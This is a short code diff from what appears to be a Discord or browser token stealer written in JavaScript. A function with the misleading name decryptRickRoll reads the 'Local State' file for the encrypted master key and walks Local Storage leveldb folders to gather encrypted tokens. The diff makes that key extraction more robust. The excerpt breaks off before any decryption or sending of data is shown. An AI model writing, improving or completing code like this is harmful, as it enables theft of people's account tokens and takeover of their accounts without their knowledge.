@@ -31,7 +31,7 @@ const decryptRickRoll = (path) => {
     const encryptedTokens = [];
     const localStatePath = join(path, 'Local State');
     if (!existsSync(localStatePath)) return;
-    const key = JSON.parse(readFileSync(localStatePath).toString())['os_crypt']['encrypted_key'];
+    const key = JSON.parse(readFileSync(localStatePath, 'utf8'))?.os_crypt?.encrypted_key;
     const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
     if (!existsSync(levelDB)) return;
     readdirSync(levelDB).map(async f => {
